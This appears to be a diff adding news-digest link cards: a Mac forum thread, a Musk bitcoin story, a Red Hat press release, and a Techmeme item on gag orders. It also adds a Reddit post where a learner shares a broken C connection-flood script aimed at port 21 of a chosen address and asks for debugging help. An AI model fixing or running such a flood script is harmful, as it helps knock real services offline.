@@ -24190,3 +24190,47 @@
 > © Instagram / Chris Cuomo By: Sophia Moore2021-06-14 03:13:19 Know what's going>>> Subscribe NOW to our YouTube <<< Last News: Sliding New York Yankees 'need to step it up,' manager Aaron Boone says. Former US Ambassador to Poland on upcoming talks between Biden and Putin. Gilbert wows in matchup with Indians' ace. VMRC residents put on art exhibit. Jeannette Memorial Hospital Set On Fire As Part Of Training Exercise. Suspects on the run following deadly robbery at Humble home, HCSO says. Galaxy S21 FE production reportedly put on hold due to chip shortage.
 
 
+***
+![Is there a problem starting the filename or foldername with a number?](https://images.macrumors.com/social/?t=2300798&v=6 "Is there a problem starting the filename or foldername with a number?")
+
+
+[Is there a problem starting the filename or foldername with a number?](https://forums.macrumors.com/threads/is-there-a-problem-starting-the-filename-or-foldername-with-a-number.2300798/)
+
+
+> Did you order new AirTags? We've opened a dedicated AirTags forum. You are using an out of date browser. It may not display this or other websites correctly.You should upgrade or use an alternative browser.
+
+
+***
+![Musk says Tesla will accept bitcoins when miners use more clean energy](https://ston.koreatimes.co.kr/web/IMAGE/upload/newsV2/images/202106/9fe4e953c16d43c3888a7c51a304c934.jpg "Musk says Tesla will accept bitcoins when miners use more clean energy")
+
+
+[Musk says Tesla will accept bitcoins when miners use more clean energy](https://www.koreatimes.co.kr/www/tech/2021/06/419_310442.html)
+
+
+> In this Feb. 9 illustration, representations of virtual currency bitcoin are seen in front of Tesla logo. Elon Musk tweeted on Sunday that the electric carmaker will resume allowing bitcoin transactions when miners who verify transactions use more renewable energy. Reuters-YonhapTesla Chief Executive Officer Elon Musk tweeted on Sunday that the electric carmaker will resume allowing bitcoin transactions when miners who verify transactions use more renewable energy."When there's confirmation of reasonable (~50 percent) clean energy usage by miners with positive future trend, Tesla will resume allowing Bitcoin transactions," he said in a tweet.
+
+
+***
+![Curriki Accelerates Social Innovation by Developing E-learning Solutions With Red Hat Open Innovation Labs](https://mms.businesswire.com/media/20210613005018/en/884621/23/Red_Hat_Logo_%282019_new%29.jpg "Curriki Accelerates Social Innovation by Developing E-learning Solutions With Red Hat Open Innovation Labs")
+
+
+[Curriki Accelerates Social Innovation by Developing E-learning Solutions With Red Hat Open Innovation Labs](https://www.businesswire.com/news/home/20210613005018/en/Curriki-Accelerates-Social-Innovation-by-Developing-E-learning-Solutions-With-Red-Hat-Open-Innovation-Labs)
+
+
+> June 13, 2021 10:00 PM Eastern Daylight Time SINGAPORE--(BUSINESS WIRE)--Red Hat, Inc., the world's leading provider of open source solutions, today announced that Curriki, a non-profit that builds tools that enable open access for all to the technologies that can transform the way educational experiences are designed, created, and delivered, has completed a six-week Red Hat Open Innovation Labs residency to develop education solutions for students using a flexible, responsive approach to developing digital learning content.
+
+
+***
+[language c](https://www.reddit.com/r/programming/comments/nzbfns/language_c/)
+
+
+> I'm studying C, I tried to make a Dos or DDos script and I managed it with guidance, but I don't understand my mistake very well and I ask for help.include include <sys/socket.h>include int main (int argc, char *argv[]){int meusocket;int conecta;char *destino;destino = argv[1];struct sockaddr_in alvo;for(conecta=0;conecta<=1000000;conecta++){meusocket = socket(AF_INET,SOCK_STREAM,0);alvo.sin_family = (AF_INET);alvo.sin_port = htons(21);alvo.sin_addr.s_addr = inet_addr(destino);conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);if(conecta == 0){printf("ATACANDO %d - \\n",porta); }}}the script runs, but it seems that it does not establish connection repeatedly with port 21 which is the FTP, if you can point and explain the error to me, I would appreciate it.
+
+
+***
+[Secret gag orders imposed by the US government on tech companies must stop, as they abuse citizens' fundamental freedoms and are no longer even used sparingly (Brad Smith/Washington Post)](http://www.techmeme.com/210613/p11#a210613p11)
+
+
+> Brad Smith / Washington Post: Secret gag orders imposed by the US government on tech companies must stop, as they abuse citizens' fundamental freedoms and are no longer even used sparingly — Brad Smith is the president of Microsoft. — The past seven days marked another bad week for the collision between technology and democracy.
+
+
